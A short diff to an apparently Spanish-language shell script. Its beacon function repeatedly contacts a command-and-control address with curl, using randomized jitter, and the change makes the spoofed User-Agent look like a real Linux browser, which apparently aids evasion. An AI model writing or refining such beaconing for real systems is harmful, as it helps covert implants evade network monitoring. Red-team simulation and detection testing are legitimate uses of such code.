@@ -20,7 +20,7 @@ byte_aleatorio() {
 
 emitir_beacons() {
   while true; do
-    curl -s -o /dev/null -A "Mozilla/5.0" "http://$C2_IP/"
+    curl -s -o /dev/null -A "Mozilla/5.0 (X11; Linux x86_64)" "http://$C2_IP/"
     espera=$((INTERVALO_MINIMO + $(byte_aleatorio) % VARIACION))
     sleep "$espera"
   done
